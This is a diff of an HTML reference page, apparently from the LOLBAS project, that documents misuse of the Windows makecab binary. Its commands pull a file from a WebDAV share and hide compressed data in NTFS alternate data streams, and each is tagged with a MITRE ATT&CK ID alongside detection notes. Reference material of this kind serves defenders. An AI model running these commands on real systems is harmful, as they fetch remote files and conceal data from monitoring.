@@ -28,18 +28,22 @@
     </div>
 </h1>
 
-
 <ul class="function-list">
-    
-    
-    <li><a href="/lolbas/Binaries/Makecab/#download">Download</a></li>
-    
-    
-    <li><a href="/lolbas/Binaries/Makecab/#ads">Alternate data streams</a></li>
-    
+	
+	
+	
+	<li><a href="/lolbas/Binaries/Makecab/#ads">Alternate data streams</a></li>
+	
+	
+	<li><a href="/lolbas/Binaries/Makecab/#download">Download</a></li>
+	
 </ul>
 
+	
+
 <p>Binary to package existing files into a cabinet (.cab) file</p>
+
+
 
 <br>
 <p><b>Paths:</b> 
@@ -53,92 +57,87 @@
 </p>
 <br>
 <b>Resources:</b> 	
-	<ul style="list-style-type:none">
+<br>
 	
-	<li><a href="https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f">https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f</a></li>
+	<a href="https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f">https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f</a>
+	<br>
 	 
-	</ul>
 <br>
 <p><b>Acknowledgement:</b> 
-	<ul style="list-style-type:none">
+<br>
 	
-	<li>Oddvar Moe - <a href="https://twitter.com/@oddvarmoe">@oddvarmoe</a </li>
+	Oddvar Moe - <a href="https://twitter.com/@oddvarmoe">@oddvarmoe</a>
+	<br>
 	 
-	</ul>
 </p>
 <br>
-<p><b>Detection:</b> 
-	<ul style="list-style-type:none">
+<p><b>Detection:</b>
+<br>
 	
-	<li>Makecab getting files from Internet</li>
+	Makecab getting files from Internet
+	<br>
 	
-	<li>Makecab storing data into alternate data streams</li>
+	Makecab storing data into alternate data streams
+	<br>
 	 
-	</ul>
 </p>
 <br>
 <br>
 
 
 
-
-
-
-<h2 id="download" class="function-name">Download</h2>
-
-<p>The LOLBAS can download files.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Download and compresses the target file and stores it in the target file.</p>
-
-		Usecase:Download file and compress into a cab file
-        <pre><code>makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a></li>
-	<br><br>	
-    
-
-</ul>
-<br><br>
-
-
-
-
-
-<h2 id="ads" class="function-name">Alternate data streams</h2>
-
-<p>The LOLBAS can write or read alternate data streams.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.</p>
-
+	
+<h2 id="ads" class ="function-name">Alternate data streams</h2>
+	
+		Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.
+		<br>
+		<pre><code>makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab</code></pre>
 		Usecase:Hide data compressed into an alternate data stream
-        <pre><code>makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1096">T1096</a></li>
-	<br><br>	
-    
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1096">T1096</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.
+		<br>
+		<pre><code>makecab \\webdavserver\webdav\file.exe C:\Folder\file.txt:file.cab</code></pre>
+		Usecase:Hide data compressed into an alternate data stream
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1096">T1096</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
-</ul>
-<br><br>
+	
+<h2 id="download" class ="function-name">Download</h2>
+	
+		Download and compresses the target file and stores it in the target file.
+		<br>
+		<pre><code>makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab</code></pre>
+		Usecase:Download file and compress into a cab file
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
         <script>
          // add permalink on headings
